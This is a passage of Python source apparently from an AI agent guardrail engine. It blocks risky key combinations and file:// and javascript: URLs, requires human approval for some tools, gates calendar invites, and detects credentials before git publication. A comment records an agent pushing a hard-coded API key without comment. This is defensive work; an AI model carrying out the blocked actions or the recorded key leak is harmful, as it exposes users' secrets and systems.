                "ctrl+alt+del",
                "ctrl+alt+f1",
                "ctrl+alt+f2",
                "ctrl+alt+f3",
                "ctrl+alt+f4",
                "ctrl+alt+f5",
                "ctrl+alt+f6",
                "ctrl+alt+f7",
                "ctrl+alt+f8",
            }
            if combo in dangerous_combos:
                return GuardrailResult(
                    allowed=False,
                    action="blocked",
                    reason=f"Dangerous key combination blocked: {combo}",
                    guardrail_name="desktop_safety",
                )

        # Block dangerous URLs in browser navigation
        if tool_name == "browser":
            action = tool_args.get("action", "")
            if action == "navigate":
                url = str(tool_args.get("targetUrl") or tool_args.get("url", "")).lower()
                if url.startswith("file://") or url.startswith("javascript:"):
                    return GuardrailResult(
                        allowed=False,
                        action="blocked",
                        reason=f"Blocked URL scheme: {url[:30]}",
                        guardrail_name="desktop_safety",
                    )

        return GuardrailResult()

    def set_human_approval_patterns(self, agent_id: str, patterns: list[str]) -> None:
        """Configure tool patterns that require human approval for an agent."""
        self._human_approval_patterns[agent_id] = patterns

    def _check_human_approval(
        self, tool_name: str, tool_args: dict[str, Any], agent_id: str
    ) -> GuardrailResult:
        """Escalate tool calls that match human_approval_tools patterns."""
        patterns = self._human_approval_patterns.get(agent_id, [])
        if not patterns:
            return GuardrailResult()
        for pattern in patterns:
            if fnmatch.fnmatch(tool_name, pattern):
                return GuardrailResult(
                    allowed=False,
                    action="escalate",
                    reason=f"Tool '{tool_name}' requires human approval",
                    guardrail_name="human_approval",
                )
        return GuardrailResult()

    def _check_recurring_meeting_proposal(
        self,
        tool_name: str,
        tool_args: dict[str, Any],
        prior_steps: list[Any],
    ) -> GuardrailResult:
        """Block high-stakes calendar invites that were not pre-proposed via email.

        High-stakes = ≥3 external-domain attendees OR starts >7d out OR has recurrence.
        Accepted evidence of proposal: a prior gws_gmail_send/gws_gmail_reply step
        in this run whose body contains time-proposing language. Alternatively,
        the caller can pass ``attendee_confirmed=true`` to certify the proposal
        happened out-of-band.
        """
        if tool_name != "gws_calendar_create":
            return GuardrailResult()

        if tool_args.get("force") or tool_args.get("attendee_confirmed"):
            return GuardrailResult()

        # Decide whether this invite is "high-stakes".
        attendees = tool_args.get("attendees", []) or []
        owner_email = _owner_email_cached()
        owner_domain = owner_email.split("@", 1)[1] if "@" in owner_email else ""
        external_attendee_count = 0
        for a in attendees:
            if not isinstance(a, str) or "@" not in a:
                continue
            dom = a.split("@", 1)[1].lower()
            if dom and dom != owner_domain:
                external_attendee_count += 1

        # Check CRM scheduling_policy for each attendee.
        policies = _lookup_scheduling_policies([a for a in attendees if isinstance(a, str)])
        if "no_auto" in policies.values():
            blocked_person = next(email for email, p in policies.items() if p == "no_auto")
            return GuardrailResult(
                allowed=False,
                action="blocked",
                reason=(
                    f"Blocked — {blocked_person} has scheduling_policy='no_auto'. "
                    "Agents may not create calendar invites for this person; "
                    "only the operator can. If the operator has approved this "
                    "invite out-of-band, pass force=true."
                ),
                guardrail_name="recurring_meeting_proposal_required",
            )
        attendee_needs_proposal = "ask_first" in policies.values()

        start = tool_args.get("start", "")
        days_out = _days_from_now(start)
        has_recurrence = bool(tool_args.get("recurrence"))

        high_stakes = (
            attendee_needs_proposal
            or external_attendee_count >= 3
            or (days_out is not None and days_out > 7)
            or has_recurrence
        )
        if not high_stakes:
            return GuardrailResult()

        # Look for a proposal step in this run.
        proposal_tools = {"gws_gmail_send", "gws_gmail_reply"}
        proposal_keywords = (
            "propose",
            "suggest",
            "availability",
            "available",
            "work for you",
            "would this work",
            "would that work",
            "does this work",
            "does that work",
            "please confirm",
            "let me know a time",
            "prefer",
        )
        for step in prior_steps:
            if getattr(step, "tool_name", None) not in proposal_tools:
                continue
            args = getattr(step, "tool_input", None) or {}
            body = str(args.get("body", "")).lower()
            if any(kw in body for kw in proposal_keywords):
                return GuardrailResult()

        return GuardrailResult(
            allowed=False,
            action="blocked",
            reason=(
                "Blocked high-stakes calendar invite — no time-proposal email was "
                "sent in this run. Send a 'does X work for you?' email first, then "
                "create the event after attendees confirm; or pass "
                "attendee_confirmed=true or force=true to certify an out-of-band "
                "confirmation."
            ),
            guardrail_name="recurring_meeting_proposal_required",
        )

    #: Git subcommands that put content somewhere it can be read later.
    #: Inspection verbs are deliberately absent — `status`, `diff` and `log`
    #: are how an agent DISCOVERS a credential, and blocking them would stop
    #: it ever finding the thing it is supposed to warn about.
    _PUBLISHING_GIT_VERBS = ("add", "commit", "push", "tag")

    def _check_secret_publication(
        self, tool_name: str, tool_args: dict[str, Any], prior_steps: list[Any] | None
    ) -> GuardrailResult:
        """Refuse to publish content the agent has already been shown is secret.

        Measured on WildClawBench 2026-08-24: asked to push a project whose
        `agent.py` held a hard-coded API key, the agent read the file, saw the
        key, and pushed it without comment. `no_sensitive_data` only warns and
        only after the fact; `no_main_branch_push` cares which branch, not
        what is in the commit.

        The evidence is what the run has already seen — the file contents and
        command output in `prior_steps` — plus the command itself. That is a
        heuristic, and it is the honest one available before execution: it
        catches the realistic shape (inspect the repo, then commit it) and
        will miss a secret in a file the agent never opened.
        """
        if tool_args.get("secret_reviewed"):
            # An explicit, visible-in-the-transcript assertion that a human
            # has dealt with it. Rotating the key is a real answer.
            return GuardrailResult()

        if not self._is_publishing_action(tool_name, tool_args):
            return GuardrailResult()

        seen = self._first_secret_kind(str(tool_args.get("command", "")))
        if seen is None:
            for step in prior_steps or []:
                seen = self._first_secret_kind(str(getattr(step, "tool_output", "") or ""))
                if seen is not None:
                    break
        if seen is None:
            return GuardrailResult()

        return GuardrailResult(
            allowed=False,
            action="blocked",
            reason=(
                f"Blocked: this run has handled what looks like a {seen}, and "
                "this command would publish it. Do not push. Tell the user "
                "which file contains the credential — without repeating its "
                "value — and that it must be removed from the code and "
                "rotated before anything is published. Once that is done, "
                "pass secret_reviewed=true."
            ),
            guardrail_name="no_secret_publication",
        )

    @staticmethod
    def _first_secret_kind(text: str) -> str | None:
        """The NAME of the first credential kind found, never the value."""
        if not text:
            return None
        # The SAME limit the output detector uses. A private, shorter cap here
        # meant this gate said "no secret" about output the detector had just
        # flagged — the 10KB bug, reintroduced one function over. Two scanners
        # with two bounds is a silent disagreement about what counts.
        haystack = text[:SENSITIVE_SCAN_LIMIT]
        for name, pattern in NAMED_SENSITIVE_PATTERNS:
            if pattern.search(haystack):
                return name
        assigned = _first_assigned_credential(haystack)
        if assigned:
            return f"credential assigned to '{assigned}'"
        return None

    @classmethod
    def _is_publishing_action(cls, tool_name: str, tool_args: dict[str, Any]) -> bool:
        if tool_name in ("git_push", "git_commit"):
            return True
        if tool_name not in ("exec", "shell"):
            return False
        command = str(tool_args.get("command", ""))
        return any(
            re.search(rf"\bgit\s+(?:-\S+\s+)*{verb}\b", command)
            for verb in cls._PUBLISHING_GIT_VERBS
        )

    def _check_sensitive_output(self, tool_name: str, tool_output: Any) -> GuardrailResult:
        """Warn if tool output contains sensitive data patterns."""
        # Scan the whole output, not a prefix. The old 10,000-character cap
        # meant the control silently skipped most of what it was pointed at:
        # a `git diff` on WildClawBench returned 53,102 characters with the
        # credential at offset 28,566, and this reported clean. Real file
        # reads and diffs are routinely larger than 10KB, so the unscanned
        # case was the common one. Six regexes over a megabyte is
        # microseconds; the bound below is a runaway guard, not a budget.
        output_str = str(tool_output)[:SENSITIVE_SCAN_LIMIT]
        for pattern in SENSITIVE_PATTERNS:
            if pattern.search(output_str):
                return GuardrailResult(
                    allowed=True,
                    action="warned",
                    reason=f"Possible sensitive data in {tool_name} output: {pattern.pattern}",
                    guardrail_name="no_sensitive_data",
                )
        # Assignment-shaped credentials, which have no recognisable format.
        # The redactor understands these; a detector that did not would mean
        # nothing was ever redacted for them.
        assigned = _first_assigned_credential(output_str)
        if assigned:
            return GuardrailResult(
                allowed=True,
                action="warned",
                reason=(f"Possible credential assigned to '{assigned}' in {tool_name} output"),
                guardrail_name="no_sensitive_data",
            )
        return GuardrailResult()


# ─── Post-run guardrails ─────────────────────────────────────────────
#
# Post-run checks don't belong on GuardrailEngine (which is per-tool-call) —
# they operate on a finished run and can enqueue side-effects like task updates.


def _collect_driven_task_ids(run: Any) -> set[str]:
    """Task IDs this run read as requires_human=true, plus any run.task_id.

    Looks at each `get_task` step's output for `requires_human` / `requiresHuman`
    (both spellings are produced by different DAL code paths).
    """
    driven: set[str] = set()
    task_id = getattr(run, "task_id", None)
    if task_id:
        driven.add(str(task_id))
    for step in getattr(run, "steps", []) or []:
        if getattr(step, "tool_name", None) != "get_task":
            continue
        out = getattr(step, "tool_output", None)
        if not isinstance(out, dict):
            continue
        flag = out.get("requires_human")
        if flag is None:
            flag = out.get("requiresHuman")
        if not flag:
            continue
        tid = out.get("id")
        if tid:
            driven.add(str(tid))
    return driven


def _collect_closed_task_ids(run: Any) -> set[str]:
    """Task IDs the run already closed or moved out of TODO via update_task/resolve_task."""
    closed: set[str] = set()
    for step in getattr(run, "steps", []) or []:
        name = getattr(step, "tool_name", None)
        if name not in ("update_task", "resolve_task"):
            continue
        args = getattr(step, "tool_input", None) or {}
        tid = args.get("id") or args.get("task_id")
        if not tid:
            continue
        if name == "resolve_task":
            closed.add(str(tid))
            continue
        # update_task: only counts as closure if it set a non-TODO status
        status = str(args.get("status", "")).upper()
        if status in {"DONE", "REVIEW", "IN_PROGRESS", "CANCELLED", "BLOCKED"}:
            closed.add(str(tid))
    return closed


def check_post_run(run: Any, agent_config: Any, tenant_id: str = "") -> list[str]:
    """Post-run enforcement — currently: requires_human_task_closure.

    If the agent has the ``requires_human_task_closure`` guardrail enabled and
    the run read any requires_human task without closing it, flip those tasks
    to IN_PROGRESS with a note tying them to this run, so the next heartbeat
    does not re-pick them.

    Returns the list of task IDs that were auto-advanced (for logging/tests).
    Silent no-op if the guardrail is not enabled for this agent.
    """
    policies = getattr(agent_config, "guardrails", []) or []
    if "requires_human_task_closure" not in policies:
        return []

    driven = _collect_driven_task_ids(run)
    if not driven:
        return []
    closed = _collect_closed_task_ids(run)
    unclosed = driven - closed
    if not unclosed:
        return []

    run_id = getattr(run, "id", "")
    agent_id = getattr(run, "agent_id", "")
    marker = (
        f"\n[{agent_id} auto-advanced by run {run_id}: "
        f"run read this requires_human task but did not close it explicitly]"
    )

    advanced: list[str] = []
    try:
        from robothor.crm.dal import DEFAULT_TENANT, get_task, update_task
    except Exception as e:
        logger.warning("check_post_run: crm.dal import failed: %s", e)
        return []

    tid_tenant = tenant_id or DEFAULT_TENANT
    for tid in unclosed:
        try:
            existing = get_task(tid, tenant_id=tid_tenant)
            if not existing:
                continue
            # Never regress a task that's already past TODO.
            current_status = str(existing.get("status", "")).upper()
            if current_status != "TODO":
                continue
            body = (existing.get("body") or "") + marker
            ok = update_task(
                tid,
                changed_by=agent_id,
                tenant_id=tid_tenant,
                status="IN_PROGRESS",
                body=body,
            )
            if ok:
                advanced.append(tid)
                logger.warning(
                    "requires_human_task_closure: auto-advanced task %s to IN_PROGRESS "
                    "(driven_by_run=%s agent=%s)",
                    tid,
                    run_id,
                    agent_id,
                )
        except Exception as e:
            logger.warning("requires_human_task_closure: failed to advance task %s: %s", tid, e)
    return advanced
